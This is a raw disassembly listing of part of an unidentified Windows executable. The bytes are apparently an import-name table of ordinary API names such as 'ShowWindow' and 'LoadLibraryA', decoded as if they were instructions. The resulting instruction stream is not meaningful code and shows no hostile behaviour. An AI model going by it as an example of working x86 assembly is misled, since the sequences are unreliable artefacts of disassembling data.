  4286e8:	outs   dx,BYTE PTR ds:[esi]
  4286e9:	outs   dx,WORD PTR ds:[esi]
  4286eb:	add    bl,bh
  4286ed:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286f1:	arpl   WORD PTR [ebx+0x50],bp
  4286f4:	outs   dx,DWORD PTR ds:[esi]
  4286f5:	jo     0x42876c
  4286f7:	jo     0x428746
  4286f9:	outs   dx,BYTE PTR gs:[esi]
  4286fb:	jne    0x4286fd
  4286fd:	add    cl,bl
  4286ff:	add    DWORD PTR [ebp+0x6f],ecx
  428702:	outs   dx,BYTE PTR ds:[esi]
  428703:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42870b:	push   edx
  42870c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428711:	add    BYTE PTR [ebx+0x68],al
  428714:	popa   
  428715:	jb     0x42876c
  428717:	jo     0x428789
  428719:	gs jb  0x428773
  42871c:	add    BYTE PTR [eax],al
  42871e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428722:	je     0x428768
  428724:	ins    BYTE PTR es:[edi],dx
  428725:	addr16 dec ecx
  428727:	je     0x42878e
  428729:	ins    DWORD PTR es:[edi],dx
  42872a:	push   esp
  42872b:	gs js  0x4287a2
  42872e:	inc    ecx
  42872f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428733:	push   0x774f776f
  428738:	outs   dx,BYTE PTR ds:[esi]
  428739:	gs fs push eax
  42873c:	outs   dx,DWORD PTR ds:[esi]
  42873d:	jo     0x4287b4
  42873f:	jo     0x4287b4
  428741:	add    BYTE PTR [eax],bl
  428743:	add    dl,BYTE PTR [edx+0x65]
  428746:	ins    DWORD PTR es:[edi],dx
  428747:	outs   dx,DWORD PTR ds:[esi]
  428748:	jbe    0x4287af
  42874a:	push   eax
  42874b:	jb     0x4287bc
  42874d:	jo     0x4287a6
  42874f:	add    BYTE PTR [edi+0x2],bh
  428752:	push   ebx
  428753:	push   0x6957776f
  428758:	outs   dx,BYTE PTR ds:[esi]
  428759:	outs   dx,DWORD PTR fs:[esi]
  42875b:	ja     0x42875d
  42875d:	add    BYTE PTR [ebx],bl
  42875f:	add    BYTE PTR [ebx+0x61],al
  428762:	ins    BYTE PTR es:[edi],dx
  428763:	ins    BYTE PTR es:[edi],dx
  428764:	push   edi
  428765:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42876c:	outs   dx,DWORD PTR ds:[esi]
  42876d:	arpl   WORD PTR [edi+0x0],dx
  428770:	mov    dh,0x1
  428772:	dec    esp
  428773:	outs   dx,DWORD PTR ds:[esi]
  428774:	popa   
  428775:	fs dec ebp
  428777:	outs   dx,BYTE PTR gs:[esi]
  428779:	jne    0x4287bc
  42877b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428782:	arpl   WORD PTR [eax+0x54],bp
  428785:	outs   dx,DWORD PTR ds:[esi]
  428786:	push   esp
  428787:	push   0x69577369
  42878c:	outs   dx,BYTE PTR ds:[esi]
  42878d:	outs   dx,DWORD PTR fs:[esi]
  42878f:	ja     0x428791
  428791:	add    BYTE PTR [eax],ah
  428793:	add    dl,BYTE PTR [ebx+0x63]
  428796:	jb     0x428807
  428798:	ins    BYTE PTR es:[edi],dx
  428799:	ins    BYTE PTR es:[edi],dx
  42879a:	push   edi
  42879b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287a2:	add    BYTE PTR [eax],al
  4287a4:	pop    DWORD PTR [eax]
  4287a6:	inc    esp
  4287a7:	gs push di
  4287aa:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287b1:	outs   dx,DWORD PTR ds:[esi]
  4287b2:	arpl   WORD PTR [edi+0x0],dx
  4287b5:	add    BYTE PTR [ecx],dh
  4287b7:	add    BYTE PTR [ebx+0x68],al
  4287ba:	popa   
  4287bb:	jb     0x42880d
  4287bd:	jb     0x428824
  4287bf:	jbe    0x428818
  4287c1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287c8:	fs popa 
  4287ca:	je     0x428831
  4287cc:	push   edx
  4287cd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287d2:	xor    eax,DWORD PTR [ecx]
  4287d4:	inc    edi
  4287d5:	gs je  0x428825
  4287d8:	outs   dx,BYTE PTR gs:[esi]
  4287da:	jne    0x428825
  4287dc:	je     0x428843
  4287de:	ins    DWORD PTR es:[edi],dx
  4287df:	dec    ecx
  4287e0:	inc    esp
  4287e1:	add    BYTE PTR ds:0x6e655302,ch
  4287e7:	fs dec esi
  4287e9:	outs   dx,DWORD PTR ds:[esi]
  4287ea:	je     0x428855
  4287ec:	data16 jns 0x42883c
  4287ef:	gs jae 0x428865
  4287f2:	popa   
  4287f3:	addr16 gs push edi
  4287f6:	add    BYTE PTR [eax],al
  4287f8:	mov    al,0x1
  4287fa:	dec    esp
  4287fb:	outs   dx,DWORD PTR ds:[esi]
  4287fc:	popa   
  4287fd:	fs dec ecx
  4287ff:	arpl   WORD PTR [edi+0x6e],bp
  428802:	push   edi
  428803:	add    BYTE PTR [ecx+0x57734901],ah
  428809:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428810:	popa   
  428811:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428815:	add    BYTE PTR ds:0x74654701,dl
  42881b:	inc    esi
  42881c:	outs   dx,DWORD PTR ds:[esi]
  42881d:	jb     0x428884
  42881f:	addr16 jb 0x428891
  428822:	jne    0x428892
  428824:	fs push edi
  428826:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42882d:	add    DWORD PTR [edi+0x65],eax
  428830:	je     0x428889
  428832:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428839:	js     0x4288af
  42883b:	inc    ecx
  42883c:	add    BYTE PTR [eax],al
  42883e:	add    DWORD PTR ds:[edi+0x65],eax
  428842:	je     0x428891
  428844:	gs jae 0x4288ba
  428847:	popa   
  428848:	addr16 gs push edi
  42884b:	add    BYTE PTR [ebx],ch
  42884d:	add    dl,BYTE PTR [ebx+0x65]
  428850:	outs   dx,BYTE PTR ds:[esi]
  428851:	fs dec ebp
  428853:	gs jae 0x4288c9
  428856:	popa   
  428857:	addr16 gs push edi
  42885a:	add    BYTE PTR [eax],al
  42885c:	das    
  42885d:	add    dl,BYTE PTR [ebx+0x65]
  428860:	je     0x4288a3
  428862:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428866:	gs push edi
  428868:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42886f:	add    dl,BYTE PTR [edx+0x65]
  428872:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42887a:	popa   
  42887b:	jae    0x4288f0
  42887d:	inc    ebp
  42887e:	js     0x4288d7
  428880:	add    BYTE PTR [eax],al
  428882:	and    DWORD PTR [edx],eax
  428884:	push   ebx
  428885:	outs   dx,BYTE PTR gs:[esi]
  428887:	fs inc esp
  428889:	ins    BYTE PTR es:[edi],dx
  42888a:	addr16 dec ecx
  42888c:	je     0x4288f3
  42888e:	ins    DWORD PTR es:[edi],dx
  42888f:	dec    ebp
  428890:	gs jae 0x428906
  428893:	popa   
  428894:	addr16 gs inc ecx
  428897:	add    BYTE PTR ds:0x74654701,bh
  42889d:	dec    ebp
  42889e:	gs jae 0x428914
  4288a1:	popa   
  4288a2:	addr16 gs push esp
  4288a5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288ac:	inc    ebx
  4288ad:	popa   
  4288ae:	jae    0x428913
  4288b0:	popa   
  4288b1:	fs gs push edi
  4288b4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288bb:	add    bh,bl
  4288bd:	add    BYTE PTR [ebp+0x78],al
  4288c0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288c8:	jae    0x42890f
  4288ca:	js     0x4288cc
  4288cc:	repnz add DWORD PTR [eax+0x6f],edx
  4288d0:	jae    0x428946
  4288d2:	dec    ebp
  4288d3:	gs jae 0x428949
  4288d6:	popa   
  4288d7:	addr16 gs push edi
  4288da:	add    BYTE PTR [eax],al
  4288dc:	add    DWORD PTR fs:[edi+0x65],eax
  4288e0:	je     0x428937
  4288e2:	jo     0x428948
  4288e4:	popa   
  4288e5:	je     0x42894c
  4288e7:	push   edx
  4288e8:	outs   dx,BYTE PTR ds:[si]
  4288ea:	add    BYTE PTR [eax],al
  4288ec:	mov    BYTE PTR [edx],al
  4288ee:	push   esp
  4288ef:	popa   
  4288f0:	bound  esp,QWORD PTR [edx+0x65]
  4288f3:	fs push esp
  4288f5:	gs js  0x42896c
  4288f8:	dec    edi
  4288f9:	jne    0x42896f
  4288fb:	push   edi
  4288fc:	add    BYTE PTR [eax],al
  4288fe:	test   eax,0x616f4c01
  428903:	fs inc edx
  428905:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42890d:	add    BYTE PTR [edx+esi*2+0x61],al
  428911:	ja     0x428966
  428913:	je     0x428976
  428915:	je     0x42897c
  428917:	push   edi
  428918:	add    BYTE PTR [eax],al
  42891a:	ja     0x42891d
  42891c:	inc    edi
  42891d:	gs je  0x428977
  428920:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428927:	js     0x42899d
  428929:	dec    esp
  42892a:	outs   dx,BYTE PTR gs:[esi]
  42892c:	addr16 je 0x428997
  42892f:	push   edi
  428930:	add    BYTE PTR [eax],al
  428932:	cmp    BYTE PTR [eax],al
  428934:	inc    ebx
  428935:	push   0x70557261
  42893a:	jo     0x4289a1
  42893c:	jb     0x428980
  42893e:	jne    0x4289a6
  428940:	push   di
  428942:	add    BYTE PTR [eax],al
  428944:	daa    
  428945:	add    DWORD PTR [edi+0x65],eax
  428948:	je     0x428995
  42894a:	gs jns 0x4289af
  42894d:	outs   dx,DWORD PTR ds:[esi]
  42894e:	popa   
  42894f:	jb     0x4289b5
  428951:	push   esp
  428952:	jns    0x4289c4
  428954:	add    BYTE PTR gs:[ebx+0x1],cl
  428958:	inc    edi
  428959:	gs je  0x4289ac
  42895c:	jb     0x4289cd
  42895e:	jo     0x4289b7
  428960:	add    BYTE PTR [eax],al
  428962:	dec    ebp
  428963:	add    BYTE PTR [ebx+0x6f],al
  428966:	jo     0x4289e1
  428968:	push   edx
  428969:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42896e:	sub    eax,0x61684300
  428973:	jb     0x4289c3
  428975:	gs js  0x4289ec
  428978:	push   edi
  428979:	add    BYTE PTR [eax+0x43734901],dl
  42897f:	push   0x6f4c7261
  428984:	ja     0x4289eb
  428986:	jb     0x4289c9
  428988:	add    BYTE PTR [eax],al
  42898a:	sub    BYTE PTR [ecx],al
  42898c:	inc    edi
  42898d:	gs je  0x4289dc
  428990:	popa   
  428991:	jae    0x428a07
  428993:	inc    ecx
  428994:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428998:	gs push eax
  42899a:	outs   dx,DWORD PTR ds:[esi]
  42899b:	jo     0x428a12
  42899d:	jo     0x42899f
  42899f:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289a5:	fs push ebx
  4289a7:	je     0x428a1b
  4289a9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289b0:	inc    edi
  4289b1:	gs je  0x428a0b
  4289b4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289bb:	outs   dx,BYTE PTR ds:[esi]
  4289bc:	addr16 push edi
  4289be:	add    BYTE PTR [eax],al
  4289c0:	leave  
  4289c1:	add    DWORD PTR [ebp+0x61],ecx
  4289c4:	jo     0x428a1d
  4289c6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289cd:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289d4:	inc    ebx
  4289d5:	push   0x6f547261
  4289da:	dec    edi
  4289db:	gs ins DWORD PTR es:[edi],dx
  4289dd:	push   edi
  4289de:	add    BYTE PTR [eax],al
  4289e0:	push   ebp
  4289e1:	push   ebx
  4289e2:	inc    ebp
  4289e3:	push   edx
  4289e4:	xor    esi,DWORD PTR [edx]
  4289e6:	cs fs ins BYTE PTR es:[edi],dx
  4289e9:	ins    BYTE PTR es:[edi],dx
  4289ea:	add    BYTE PTR [eax],al
  4289ec:	xchg   edx,eax
  4289ed:	add    edx,DWORD PTR [edx+0x74]
  4289f0:	ins    BYTE PTR es:[edi],dx
  4289f1:	dec    ecx
  4289f2:	outs   dx,BYTE PTR ds:[esi]
  4289f3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289fb:	jb     0x428a66
  4289fd:	outs   dx,BYTE PTR ds:[esi]
  4289fe:	add    BYTE PTR [bp+0x74],ch
  428a02:	fs ins BYTE PTR es:[edi],dx
  428a04:	ins    BYTE PTR es:[edi],dx
  428a05:	cs fs ins BYTE PTR es:[edi],dx
  428a08:	ins    BYTE PTR es:[edi],dx
  428a09:	add    BYTE PTR ds:0x74654702,al
  428a0f:	dec    esp
  428a10:	outs   dx,DWORD PTR ds:[esi]
  428a11:	arpl   WORD PTR [ecx+0x6c],sp
  428a14:	gs dec ecx
  428a16:	outs   dx,BYTE PTR ds:[esi]
  428a17:	outs   dx,WORD PTR ds:[esi]
  428a19:	push   edi
  428a1a:	add    BYTE PTR [eax],al
  428a1c:	inc    ebp
  428a1d:	add    al,BYTE PTR [edi+0x65]
  428a20:	je     0x428a72
  428a22:	jb     0x428a93
  428a24:	arpl   WORD PTR [ecx+0x64],ax
  428a27:	fs jb  0x428a8f
  428a2a:	jae    0x428a9f
  428a2c:	add    BYTE PTR [eax],al
  428a2e:	rol    DWORD PTR [eax],cl
  428a30:	inc    ebx
  428a31:	jb     0x428a98
  428a33:	popa   
  428a34:	je     0x428a9b
  428a36:	inc    esi
  428a37:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a3f:	outs   dx,BYTE PTR ds:[esi]
  428a40:	addr16 push edi
  428a42:	add    BYTE PTR [eax],al
  428a44:	sub    BYTE PTR [ebx+edx*2],al
  428a47:	gs je  0x428a92
  428a4a:	popa   
  428a4b:	outs   dx,BYTE PTR ds:[esi]
  428a4c:	fs ins BYTE PTR es:[edi],dx
  428a4e:	gs inc ebx
  428a50:	outs   dx,DWORD PTR ds:[esi]
  428a51:	jne    0x428ac1
  428a53:	je     0x428a55
  428a55:	add    ah,bl
  428a57:	add    BYTE PTR [ebx+0x72],al
  428a5a:	gs popa 
  428a5c:	je     0x428ac3
  428a5e:	dec    ebp
  428a5f:	popa   
  428a60:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a68:	pop    DWORD PTR [ecx]
  428a6a:	inc    edi
  428a6b:	gs je  0x428aaf
  428a6e:	je     0x428adf
  428a70:	ins    DWORD PTR es:[edi],dx
  428a71:	dec    esi
  428a72:	popa   
  428a73:	ins    DWORD PTR es:[edi],dx
  428a74:	gs inc ecx
  428a76:	add    BYTE PTR [eax],al
  428a78:	pusha  
  428a79:	add    al,BYTE PTR [edi+0x65]
  428a7c:	je     0x428ad1
  428a7e:	jns    0x428af3
  428a80:	je     0x428ae7
  428a82:	ins    DWORD PTR es:[edi],dx
  428a83:	push   edi
  428a84:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a8b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a92:	jns    0x428ad5
  428a94:	add    BYTE PTR [eax],al
  428a96:	aas    
  428a97:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a9b:	fs dec esp
  428a9d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428aa4:	add    BYTE PTR [eax],al
  428aa6:	xchg   ecx,eax
  428aa7:	add    al,BYTE PTR [edi+0x6c]
  428aaa:	outs   dx,DWORD PTR ds:[esi]
  428aab:	bound  esp,QWORD PTR [ecx+0x6c]
  428aae:	inc    ecx
  428aaf:	ins    BYTE PTR es:[edi],dx
  428ab0:	ins    BYTE PTR es:[edi],dx
  428ab1:	outs   dx,DWORD PTR ds:[esi]
  428ab2:	arpl   WORD PTR [eax],ax
  428ab4:	xchg   edx,eax
  428ab5:	add    al,0x56
  428ab7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428abe:	jne    0x428b25
  428ac0:	jb     0x428b3b
  428ac2:	add    BYTE PTR [eax],al
  428ac4:	test   DWORD PTR [ecx],0x46746547
  428aca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ad2:	jb     0x428ad5
  428ad4:	inc    esi
  428ad5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428adc:	jne    0x428b50
  428ade:	arpl   WORD PTR [ebp+0x57],sp
  428ae1:	add    BYTE PTR [eax],bh
  428ae3:	add    ecx,DWORD PTR [ebp+0x6f]
  428ae6:	jbe    0x428b4d
  428ae8:	inc    esi
  428ae9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428af1:	popa   
  428af2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428af9:	jo     0x428b6f
  428afb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b02:	inc    edi
  428b03:	gs je  0x428b48
  428b06:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b0d:	jo     0x428b74
  428b0f:	inc    ecx
  428b10:	add    BYTE PTR [eax],al
  428b12:	and    DWORD PTR [ebx+edx*2],eax
  428b15:	gs je  0x428b5e
  428b18:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b20:	bound  esi,QWORD PTR [ebp+0x74]
  428b23:	gs jae 0x428b67
  428b26:	add    BYTE PTR [eax],al
  428b28:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b2c:	jbe    0x428b93
  428b2e:	inc    esi
  428b2f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b37:	add    BYTE PTR [ebx+0x6f],al
  428b3a:	jo     0x428bb5
  428b3c:	inc    esi
  428b3d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b45:	jne    0x428bac
  428b47:	jb     0x428bc2
  428b49:	push   eax
  428b4a:	gs jb  0x428bb3
  428b4d:	outs   dx,DWORD PTR ds:[esi]
  428b4e:	jb     0x428bbd
  428b50:	popa   
  428b51:	outs   dx,BYTE PTR ds:[esi]
  428b52:	arpl   WORD PTR [ebp+0x43],sp
  428b55:	outs   dx,DWORD PTR ds:[esi]
  428b56:	jne    0x428bc6
  428b58:	je     0x428bbf
  428b5a:	jb     0x428b5c
  428b5c:	sub    DWORD PTR [ebx+edx*2],eax
  428b5f:	gs je  0x428baa
  428b62:	popa   
  428b63:	outs   dx,BYTE PTR ds:[esi]
  428b64:	fs ins BYTE PTR es:[edi],dx
  428b66:	gs dec ecx
  428b68:	outs   dx,BYTE PTR ds:[esi]
  428b69:	outs   dx,WORD PTR ds:[esi]
  428b6b:	jb     0x428bda
  428b6d:	popa   
  428b6e:	je     0x428bd9
  428b70:	outs   dx,DWORD PTR ds:[esi]
  428b71:	outs   dx,BYTE PTR ds:[esi]
  428b72:	add    BYTE PTR [eax],al
  428b74:	push   ss
  428b75:	add    DWORD PTR [ebp+0x6e],eax
  428b78:	je     0x428bdf
  428b7a:	jb     0x428bbf
  428b7c:	jb     0x428be7
  428b7e:	je     0x428be9
  428b80:	arpl   WORD PTR [ecx+0x6c],sp
  428b83:	push   ebx
  428b84:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b89:	outs   dx,BYTE PTR ds:[esi]
  428b8a:	add    BYTE PTR [eax],al
  428b8c:	jg     0x428b8f
  428b8e:	inc    esi
  428b8f:	outs   dx,DWORD PTR ds:[esi]
  428b90:	ins    BYTE PTR es:[edi],dx
  428b91:	fs push ebx
  428b93:	je     0x428c07
  428b95:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b9c:	ins    BYTE PTR es:[edi],dx
  428b9d:	jae    0x428c13
  428b9f:	jb     0x428c0d
  428ba1:	outs   dx,BYTE PTR gs:[esi]
  428ba3:	inc    ecx
  428ba4:	add    BYTE PTR [eax],al
  428ba6:	sahf   
  428ba7:	add    DWORD PTR [edi+0x65],eax
  428baa:	je     0x428bef
  428bac:	outs   dx,DWORD PTR ds:[esi]
  428bad:	ins    DWORD PTR es:[edi],dx
  428bae:	ins    DWORD PTR es:[edi],dx
  428baf:	push   esp
  428bb0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bb7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bbb:	gs je  0x428c12
  428bbe:	push   0x64616572
  428bc3:	push   esp
  428bc4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bcb:	inc    ebp
  428bcc:	push   edx
  428bcd:	dec    esi
  428bce:	inc    ebp
  428bcf:	dec    esp
  428bd0:	xor    esi,DWORD PTR [edx]
  428bd2:	cs fs ins BYTE PTR es:[edi],dx
  428bd5:	ins    BYTE PTR es:[edi],dx
  428bd6:	add    BYTE PTR [eax],al
  428bd8:	mov    dh,0x1
  428bda:	push   eax
  428bdb:	outs   dx,DWORD PTR ds:[esi]
  428bdc:	ins    BYTE PTR es:[edi],dx
  428bdd:	jns    0x428c46
  428bdf:	outs   dx,DWORD PTR ds:[esi]
  428be0:	outs   dx,BYTE PTR ds:[esi]
  428be1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428be5:	gs je  0x428c37
  428be8:	bound  ebp,QWORD PTR [edx+0x65]
  428beb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bef:	add    BYTE PTR [ebx+0x6c654400],dh
  428bf5:	gs je  0x428c5d
  428bf8:	inc    esp
  428bf9:	inc    ebx
  428bfa:	add    BYTE PTR [eax],al
  428bfc:	rol    DWORD PTR [ecx],1
  428bfe:	push   ebx
  428bff:	gs ins BYTE PTR es:[edi],dx
  428c01:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c06:	push   0x65
  428c08:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c0c:	jmp    0x428c0f
  428c0e:	push   ebx
  428c0f:	gs je  0x428c5f
  428c12:	popa   
  428c13:	jo     0x428c62
  428c15:	outs   dx,DWORD PTR ds:[esi]
  428c16:	fs add BYTE PTR gs:[eax],al
  428c1a:	leave  
  428c1b:	add    DWORD PTR [edx+0x6f],edx
  428c1e:	jne    0x428c8e
  428c20:	fs push edx
  428c22:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c27:	add    BYTE PTR [edx+0x69],al
  428c2a:	je     0x428c6e
  428c2c:	ins    BYTE PTR es:[edi],dx
  428c2d:	je     0x428c2f
  428c2f:	add    BYTE PTR [ebx+0x61655201],bh
  428c35:	ins    BYTE PTR es:[edi],dx
  428c36:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c3d:	je     0x428cb3
  428c3f:	add    BYTE PTR gs:[eax],al
  428c42:	jge    0x428c45
  428c44:	inc    edi
  428c45:	gs je  0x428c9b
  428c48:	jns    0x428cbd
  428c4a:	je     0x428cb1
  428c4c:	ins    DWORD PTR es:[edi],dx
  428c4d:	push   eax
  428c4e:	popa   
  428c4f:	ins    BYTE PTR es:[edi],dx
  428c50:	gs je  0x428cc7
  428c53:	gs push ebp
  428c55:	jae    0x428cbc
  428c57:	add    BYTE PTR [eax+0x74654701],cl
  428c5d:	push   esp
  428c5e:	gs js  0x428cd5
  428c61:	inc    ebp
  428c62:	js     0x428cd8
  428c64:	outs   dx,BYTE PTR gs:[esi]
  428c66:	je     0x428cb8
  428c68:	outs   dx,DWORD PTR ds:[esi]
  428c69:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c70:	push   ebx
  428c71:	arpl   WORD PTR [ecx+0x6c],sp
  428c74:	gs push esi
  428c76:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c7d:	inc    ebp
  428c7e:	js     0x428cf4
  428c80:	inc    ebp
  428c81:	js     0x428c83
  428c83:	add    bh,cl
  428c85:	add    DWORD PTR [ebx+0x65],edx
  428c88:	ins    BYTE PTR es:[edi],dx
  428c89:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c8e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c95:	add    DWORD PTR [ebx+0x65],edx
  428c98:	je     0x428cee
  428c9a:	gs js  0x428d11
  428c9d:	inc    ebx
  428c9e:	outs   dx,DWORD PTR ds:[esi]
  428c9f:	ins    BYTE PTR es:[edi],dx
  428ca0:	outs   dx,DWORD PTR ds:[esi]
  428ca1:	jb     0x428ca3
  428ca3:	add    BYTE PTR [eax+0x74615001],ch
  428ca9:	push   0x65526f54
  428cae:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cb6:	inc    ebx
  428cb7:	outs   dx,DWORD PTR ds:[esi]
  428cb8:	ins    DWORD PTR es:[edi],dx
  428cb9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428cbc:	gs push edx
  428cbe:	outs   dx,BYTE PTR ds:[si]
  428cc0:	add    BYTE PTR [eax],al
  428cc2:	lods   al,BYTE PTR ds:[esi]
  428cc3:	add    BYTE PTR [ebx+0x72],al
  428cc6:	gs popa 
  428cc8:	je     0x428d2f
  428cca:	push   edx
  428ccb:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428cd0:	outs   dx,BYTE PTR ds:[esi]
  428cd1:	dec    ecx
  428cd2:	outs   dx,BYTE PTR ds:[esi]
  428cd3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428cdb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cdf:	gs push esp
  428ce1:	outs   dx,DWORD PTR ds:[esi]
  428ce2:	add    BYTE PTR [eax],al
  428ce4:	mov    ds:0x65724300,al
  428ce9:	popa   
  428cea:	je     0x428d51
  428cec:	dec    ecx
  428ced:	inc    ebx
  428cee:	push   edi
  428cef:	add    BYTE PTR [ebp+0x63655201],bh
  428cf5:	je     0x428d4d
  428cf7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cff:	add    BYTE PTR [ebx+0x72],al
  428d02:	gs popa 
  428d04:	je     0x428d6b
  428d06:	push   eax
  428d07:	popa   
  428d08:	ins    BYTE PTR es:[edi],dx
  428d09:	gs je  0x428d80
  428d0c:	add    BYTE PTR gs:[edi+0x44],al
  428d10:	dec    ecx
  428d11:	xor    esi,DWORD PTR [edx]
  428d13:	cs fs ins BYTE PTR es:[edi],dx
  428d16:	ins    BYTE PTR es:[edi],dx
	...
  428d1f:	add    BYTE PTR [ebx+0x20],ah
  428d22:	add    al,BYTE PTR [eax]
	...
  428d40:	pop    ebx
  428d41:	lea    eax,[edx]
	...
  428d4f:	add    BYTE PTR [ecx+0x64],ch
  428d52:	js     0x428dbd
  428d54:	outs   dx,DWORD PTR fs:[esi]
  428d56:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d5a:	add    BYTE PTR [ebx+0x65],dl
  428d5d:	je     0x428da0
  428d5f:	outs   dx,BYTE PTR ds:[esi]
  428d60:	arpl   WORD PTR [eax+0x6f],bp
  428d63:	jb     0x428db4
  428d65:	jb     0x428dd0
  428d67:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d6f:	add    BYTE PTR [eax],al
  428d71:	add    BYTE PTR [eax],al
  428d73:	add    al,ch
  428d75:	test   DWORD PTR [edx],eax
  428d77:	add    BYTE PTR [esi+eax*4],al
  428d7a:	add    al,BYTE PTR [eax]
  428d7c:	push   ss
  428d7d:	xchg   BYTE PTR [edx],al
  428d7f:	add    BYTE PTR [eax],ch
  428d81:	xchg   BYTE PTR [edx],al
  428d83:	add    BYTE PTR [eax-0x7a],al
  428d86:	add    al,BYTE PTR [eax]
  428d88:	push   esp
  428d89:	xchg   BYTE PTR [edx],al
  428d8b:	add    BYTE PTR [esi-0x7a],ch
  428d8e:	add    al,BYTE PTR [eax]
  428d90:	add    BYTE PTR [eax],al
  428d92:	add    BYTE PTR [eax],al
  428d94:	nop
  428d95:	xchg   BYTE PTR [edx],al
  428d97:	add    BYTE PTR [esi-0x43fffd7a],ch
  428d9d:	xchg   BYTE PTR [edx],al
  428d9f:	add    dl,cl
  428da1:	xchg   BYTE PTR [edx],al
  428da3:	add    dh,bl
  428da5:	xchg   BYTE PTR [edx],al
  428da7:	add    ah,ch
  428da9:	xchg   BYTE PTR [edx],al
  428dab:	add    dh,bh
  428dad:	xchg   BYTE PTR [edx],al
  428daf:	add    BYTE PTR [eax],dl
  428db1:	xchg   DWORD PTR [edx],eax
  428db3:	add    BYTE PTR [esi],bl
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    BYTE PTR [eax],dh
  428db9:	xchg   DWORD PTR [edx],eax
  428dbb:	add    BYTE PTR [edx-0x79],al
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	push   eax
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    BYTE PTR [esi-0x79],bl
  428dc6:	add    al,BYTE PTR [eax]
  428dc8:	jo     0x428d51
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	jl     0x428d55
  428dce:	add    al,BYTE PTR [eax]
  428dd0:	xchg   edx,eax
  428dd1:	xchg   DWORD PTR [edx],eax
  428dd3:	add    BYTE PTR [edi+eax*4-0x7849fffe],ah
  428dda:	add    al,BYTE PTR [eax]
  428ddc:	ret    0x287
  428ddf:	add    dl,dl
  428de1:	xchg   DWORD PTR [edx],eax
  428de3:	add    dl,ah
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    al,bh
  428de9:	xchg   DWORD PTR [edx],eax
  428deb:	add    BYTE PTR [eax+ecx*4],al
  428dee:	add    al,BYTE PTR [eax]
  428df0:	push   ss
